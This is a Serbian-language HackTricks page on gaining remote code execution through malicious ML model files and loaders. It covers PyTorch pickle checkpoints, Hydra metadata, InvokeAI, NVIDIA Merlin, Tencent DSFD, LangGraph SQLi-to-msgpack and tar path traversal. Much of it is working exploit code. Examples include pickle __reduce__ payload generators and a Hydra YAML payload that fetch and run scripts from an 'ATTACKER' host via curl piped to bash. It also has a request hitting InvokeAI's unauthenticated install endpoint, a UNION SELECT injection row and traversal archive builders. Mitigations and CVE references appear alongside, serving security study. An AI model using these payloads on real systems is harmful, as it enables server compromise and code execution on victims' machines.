# Modeli RCE

{{#include ../banners/hacktricks-training.md}}

## Učitavanje modela za RCE

Modeli za Machine Learning obično se dele u različitim formatima, kao što su ONNX, TensorFlow, PyTorch itd. Programeri mogu da učitaju ove modele na svojim mašinama ili u produkcionim sistemima. Modeli obično ne bi trebalo da sadrže zlonameran kod, ali u nekim slučajevima model može da se iskoristi za izvršavanje proizvoljnog koda na sistemu, bilo kao predviđena funkcija ili zbog ranjivosti u biblioteci za učitavanje modela.

Sledeća tabela navodi reprezentativne ranjivosti iz ove kategorije:

| **Framework / Tool**        | **Ranjivost (CVE ako je dostupna)**                                                    | **RCE vektor**                                                                                                                           | **Reference**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Nesigurna deserializacija u* `torch.load` **(CVE-2025-32434)**                                                              | Zlonameran pickle u checkpoint-u modela dovodi do izvršavanja koda (zaobilazi zaštitu `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + preuzimanje zlonamernog modela dovodi do izvršavanja koda; RCE putem Java deserializacije u management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Nesigurna deserializacija checkpoint-a putem `torch.load` **(CVE-2025-23298)**                                           | Nepouzdan checkpoint pokreće pickle reducer tokom `load_model_trainer_states_from_checkpoint` → izvršavanje koda u ML worker-u            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + nesiguran MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Ključ `filter` pod kontrolom korisnika ubacuje SQL/JSON-path sintaksu, `UNION SELECT` pravi lažni red checkpoint-a, a zatim `msgpack` deserializacija uvozi i poziva Python kod koji je izabrao napadač | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (nesiguran YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Učitavanje modela iz YAML-a koristi `yaml.unsafe_load` (izvršavanje koda) <br> Učitavanje modela sa slojem **Lambda** pokreće proizvoljan Python kod          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsiranje)                                                                                          | Pripremljen `.tflite` model izaziva integer overflow → oštećenje heap-a (potencijalni RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Učitavanje modela putem `joblib.load` izvršava pickle sa napadačevim payload-ом `__reduce__`                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (nesiguran `np.load`) *osporavan*                                                                              | Podrazumevano je `numpy.load` dozvoljavao pickled object arrays – zlonameran `.npy/.npz` izaziva izvršavanje koda                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (directory traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Putanja do spoljnih težina ONNX modela može izaći iz direktorijuma (čitanje proizvoljnih fajlova) <br> Zlonameran ONNX model tar može da prepiše proizvoljne fajlove (što može dovesti do RCE) | |
| ONNX Runtime (design risk)  | *(Nema CVE)* ONNX custom ops / control flow                                                                                    | Model sa custom operator-om zahteva učitavanje napadačevog native koda; složeni model graphs zloupotrebljavaju logiku za izvršavanje nenamernih proračuna   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Korišćenje API-ja za učitavanje modela uz omogućenu opciju `--model-control` dozvoljava relativni path traversal za upisivanje fajlova (npr. prepisivanje `.bashrc` radi RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (više heap overflow ranjivosti)                                                                         | Neispravan GGUF fajl modela izaziva heap buffer overflows u parser-u, što omogućava izvršavanje proizvoljnog koda na sistemu žrtve                     | |
| **Keras (stariji formati)**   | *(Nema novog CVE-a)* Legacy Keras H5 model                                                                                         | Zlonameran HDF5 (`.h5`) model sa slojem Lambda i dalje izvršava kod pri učitavanju (Keras safe_mode ne obuhvata stari format – „downgrade attack“) | |
| **Others** (general)        | *Greška u dizajnu* – Pickle serialization                                                                                         | Mnogi ML alati (npr. formati modela zasnovani na pickle-u, Python `pickle.load`) izvršavaju proizvoljan kod ugrađen u fajlove modela ako se to ne spreči | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Nepouzdani metapodaci prosleđeni u `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Metapodaci/konfiguracija modela pod kontrolom napadača postavljaju `_target_` na proizvoljan callable (npr. `builtins.exec`) → izvršava se tokom učitavanja, čak i uz „bezbedne“ formate (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Pored toga, postoje Python modeli zasnovani na pickle-u, kao što su oni koje koristi [PyTorch](https://github.com/pytorch/pytorch/security), a koji mogu da se iskoriste za izvršavanje proizvoljnog koda na sistemu ako se ne učitavaju sa `weights_only=True`. Zato svaki model zasnovan na pickle-u može biti posebno podložan ovoj vrsti napada, čak i ako nije naveden u gornjoj tabeli.

### Hydra metapodaci → RCE (radi i sa safetensors)

`hydra.utils.instantiate()` uvozi i poziva bilo koji dotted `_target_` u objektu konfiguracije/metapodataka. Kada biblioteke kao što je Hugging Face Transformers proslede **nepouzdane metapodatke modela** u `instantiate()`, napadač može da navede callable i argumente koji se odmah izvršavaju tokom učitavanja modela (pickle nije potreban).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Primer payload-a (radi u `model_config.yaml` u `.nemo`, `config.json` u repo-u ili `__metadata__` unutar `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Ključne tačke:
- Aktivira se pre inicijalizacije modela u funkcijama `restore_from/from_pretrained` u NeMo, HuggingFace coderima za uni2TS i FlexTok loaderima.
- Hydra-ina string block-lista može da se zaobiđe alternativnim putanjama za import (npr. `enum.bltns.eval`) ili imenima koja razrešava aplikacija (npr. `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok takođe parsira stringifikovane metapodatke pomoću `ast.literal_eval`, što omogućava DoS (prekomernu potrošnju CPU-a i memorije) pre poziva Hydra-e.

### 🆕  InvokeAI RCE pomoću `torch.load` (CVE-2024-12029)

`InvokeAI` je popularan web interfejs otvorenog koda za Stable-Diffusion. Verzije **5.3.1 – 5.4.2** izlažu REST endpoint `/api/v2/models/install`, koji korisnicima omogućava da preuzimaju i učitavaju modele sa proizvoljnih URL-ova.<sup>[[1]](#references)</sup>

Interno, endpoint na kraju poziva:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Kada je dostavljena datoteka **PyTorch checkpoint (`*.ckpt`)**, `torch.load` obavlja **pickle deserijalizaciju**. Pošto sadržaj dolazi direktno sa URL-a pod kontrolom korisnika, napadač može da ugradi zlonameran objekat sa prilagođenom metodom `__reduce__` u checkpoint; ta metoda se izvršava **tokom deserijalizacije**, što dovodi do **remote code execution (RCE)** na InvokeAI serveru.

Ranjivosti je dodeljen **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Koraci za eksploataciju

1. Napravite zlonameran checkpoint:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Hostujte `payload.ckpt` na HTTP serveru koji kontrolišete (npr. `http://ATTACKER/payload.ckpt`).
3. Aktivirajte ranjivu krajnju tačku (autentifikacija nije potrebna):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Kada InvokeAI preuzme fajl, poziva `torch.load()` → gadget `os.system` se izvršava i napadač dobija mogućnost izvršavanja koda u kontekstu procesa InvokeAI.

Gotov exploit: modul **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` automatizuje ceo postupak.<sup>[[3]](#references)</sup>

#### Uslovi

•  InvokeAI 5.3.1-5.4.2 (podrazumevana vrednost zastavice **false**)
•  Napadač može da pristupi putanji `/api/v2/models/install`
•  Proces ima dozvole za izvršavanje shell komandi

#### Mere zaštite

* Nadogradite na **InvokeAI ≥ 5.4.3** – zakrpa podrazumevano postavlja `scan=True` i skenira u potrazi za malverom pre deserijalizacije.<sup>[[2]](#references)</sup>
* Kada programski učitavate checkpoints, koristite `torch.load(file, weights_only=True)` ili novi pomoćni alat [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Sprovodite liste dozvoljenih izvora / potpisa za modele i pokrenite servis uz minimalne privilegije.

> ⚠️ Imajte na umu da je svaki format zasnovan na Python pickle-u (uključujući mnoge `.pt`, `.pkl`, `.ckpt`, `.pth` fajlove) sam po sebi nebezbedan za deserijalizaciju iz nepouzdanih izvora.

---

Primer ad hoc mere zaštite ako morate da nastavite da koristite starije verzije InvokeAI iza reverse proxy-ja:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE preko nebezbednog `torch.load` (CVE-2025-23298)

NVIDIA Transformers4Rec (deo Merlin-a) izložio je nebezbedan učitavač checkpoint-a koji je direktno pozivao `torch.load()` nad putanjama koje je dostavio korisnik. Pošto se `torch.load` oslanja na Python `pickle`, checkpoint pod kontrolom napadača može da izvrši proizvoljan kod putem reducer-a tokom deserijalizacije.<sup>[[5]](#references)</sup>

Ranjiva putanja (pre ispravke): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Zašto ovo dovodi do RCE: U Python pickle-u, objekat može da definiše reducer (`__reduce__`/`__setstate__`) koji vraća pozivljivi objekat i argumente. Taj pozivljivi objekat se izvršava tokom unpickling-a. Ako se takav objekat nalazi u checkpoint-u, izvršava se pre nego što se upotrebe bilo koje težine.

Minimalni primer zlonamernog checkpoint-a:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Vektori isporuke i domet uticaja:
- Trojanski izmenjeni checkpoint-i/modeli deljeni putem repozitorijuma, bucket-a ili registara artefakata
- Automatizovani pipeline-ovi za nastavak/implementaciju koji automatski učitavaju checkpoint-e
- Izvršavanje se odvija unutar worker-a za treniranje/inferenciju, često sa povišenim privilegijama (npr. root u kontejnerima)

Ispravka: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) zamenio je direktni poziv `torch.load()` ograničenim deserializer-om sa allow-list-om, implementiranim u `transformers4rec/utils/serialization.py`. Novi loader proverava tipove/polja i sprečava pozivanje proizvoljnih callable objekata tokom učitavanja.<sup>[[7]](#references)</sup>

Preporuke za zaštitu specifične za PyTorch checkpoint-e:
- Nemojte unpickle-ovati nepouzdane podatke. Kad god je moguće, dajte prednost formatima koji ne omogućavaju izvršavanje koda, kao što su [Safetensors](https://huggingface.co/docs/safetensors/index) ili ONNX.
- Ako morate da koristite PyTorch serialization, uverite se da je `weights_only=True` (podržano u novijim verzijama PyTorch-a) ili koristite prilagođeni unpickler sa allow-list-om, sličan onom iz Transformers4Rec zakrpe.<sup>[[4]](#references)</sup>
- Proveravajte poreklo/potpise modela i izolujte deserialization (seccomp/AppArmor; korisnik koji nije root; ograničen FS i bez odlaznog mrežnog saobraćaja).
- Pratite neočekivane child procese koje pokreću ML servisi tokom učitavanja checkpoint-a; evidentirajte upotrebu `torch.load()`/`pickle`.

POC i reference na ranjivu verziju/zakrpu:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Ranjivi loader pre zakrpe: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC zlonamernog checkpoint-a: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader nakon zakrpe: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Primer – izrada zlonamernog PyTorch modela

- Kreirajte model:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Učitajte model:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserijalizacija Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencentov FaceDetection-DSFD izlaže endpoint `resnet` koji deserijalizuje podatke pod kontrolom korisnika. ZDI je potvrdio da napadač na daljinu može da navede žrtvu da učita zlonamernu stranicu/datoteku, da ona pošalje posebno napravljen serijalizovani blob tom endpointu i pokrene deserijalizaciju sa privilegijama `root`, što dovodi do potpune kompromitacije.

Tok eksploatacije podseća na tipičnu zloupotrebu pickle-a:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Svaki gadget dostupan tokom deserializacije (konstruktori, `__setstate__`, povratni pozivi frameworka itd.) može se na isti način pretvoriti u oružje, bez obzira na to da li je prenos obavljen preko HTTP-a, WebSocket-a ili datoteke smeštene u direktorijum koji se nadgleda.



### LangGraph checkpointer SQLi → MessagePack RCE

Ovaj lanac napada je zanimljiv zato što napadač **ne mora da otpremi zlonamernu datoteku modela**. Umesto toga, aplikacija izlaže **API za perzistenciju AI agenata** (`get_state_history(..., filter=...)`), a korisnički unos dospeva do checkpointer alata za sastavljanje upita.

#### 1. Strukturni SQLi u filterima metapodataka

Ranljiv SQLite obrazac izgledao je ovako:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Vrednost se vezuje kasnije, ali se `query_key` konkatenira u **JSON path string**, pa `'` unutar ključa rečnika izlazi iz `'$.{query_key}'` i ubacuje SQL. Ista pouka važi za **JSON paths, identifiers, operators, `LIMIT` i TTL fields**: placeholders štite samo vrednosti, ne i strukturnu sintaksu upita.

#### 2. `UNION SELECT` može da cilja nizvodne sinks, a ne samo krađu podataka

Upit vraća `type` i serijalizovane `checkpoint` bajtove, koje kasnije obrađuju:

```python
self.serde.loads_typed((type, checkpoint))
```

To znači da SQLi u klauzuli `WHERE` može da ubaci **lažni red rezultata**:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Ako kasniji kod parsira, deserijalizuje, upisuje ili izvršava neku izabranu kolonu, povežite te kolone sa njihovim odredištima. U ovom slučaju, lažni red pretvara SQLi u **deserijalizaciju pod kontrolom napadača**.

#### 3. Nebezbedni MessagePack extension hook-ovi ekvivalentni su code gadget-ima

LangGraph-ova `msgpack` putanja koristila je prilagođeni extension hook koji je raspakovao ugnježdeni tuple i izvršio:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Dakle, MessagePack extension objekat koji kodira nešto ekvivalentno izrazu `("os", "system", "id > /tmp/pwned")` uvozi `os`, razrešava `system` i izvršava komandu. Pri pregledu AI frameworka proverite **custom MessagePack/JSON/pickle revivere** za dinamičke importe, refleksiju ili proizvoljno pozivanje funkcija.

#### 4. Praktični obrazac za audit agent frameworka

Pregledajte svaki korisnički kontrolisani ulaz koji dospeva do:
- API-ja za listanje istorije stanja / memorije / ponovnog reprodukovanja / checkpointa
- alata za izradu strukturiranih filtera koji generišu SQL ili delove Redis upita
- prilagođenih deserializatora (`pickle`, `msgpack`, `json` object hooks, YAML konstruktori)
- putanja za oporavak koje veruju redovima vraćenim iz sloja za perzistenciju

Ovaj konkretan niz ranjivosti uticao je na self-hosted LangGraph deployment-e koji koriste SQLite ili Redis checkpointe, kada su nepouzdani korisnici mogli da kontrolišu `filter`. Zakrpljene verzije navedene u obaveštenju bile su `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` i `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

## Modeli do Path Traversal napada

Kao što je navedeno u [**ovom blog postu**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), formati većine modela koje koriste različiti AI frameworki zasnovani su na arhivama, obično `.zip` datotekama. Zato bi ove formate možda bilo moguće zloupotrebiti za izvođenje path traversal napada, što omogućava čitanje proizvoljnih datoteka sa sistema na kojem se model učitava.<sup>[[16]](#references)</sup>

Na primer, sledećim kodom možete da napravite model koji će prilikom učitavanja kreirati datoteku u direktorijumu `/tmp`:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Ili, pomoću sledećeg koda možete kreirati model koji će prilikom učitavanja kreirati symlink ka direktorijumu `/tmp`:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Detaljan pregled: Keras .keras deserijalizacija i potraga za gadgetima

Za fokusirani vodič o internim detaljima formata .keras, RCE-u preko Lambda sloja, problemu proizvoljnog uvoza u verzijama ≤ 3.8 i otkrivanju gadgeta unutar allowlist-e nakon ispravke, pogledajte:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec blog – "CVE-2024-12029 – InvokeAI: deserijalizacija nepouzdanih podataka"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Commit ispravke za InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Dokumentacija modula Rapid7 Metasploit](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – bezbednosna razmatranja za torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI blog – CVE-2025-23298: ostvarivanje udaljenog izvršavanja koda u NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI savet: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Commit ispravke za Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Ranjivi loader pre ispravke (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC zlonamernog kontrolnog punkta (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader nakon ispravke (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – udaljeno izvršavanje koda pomoću savremenih AI/ML formata i biblioteka](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Dokumentacija za Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Commit za block-listu u Hydri (upozorenje o RCE-u)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – Od SQLi do RCE-a: iskorišćavanje LangGraph-ovog checkpointer-a](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Pretvaranje grešaka Archive Slip u unosne AI/ML bounty nagrade](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
{{#include ../banners/hacktricks-training.md}}
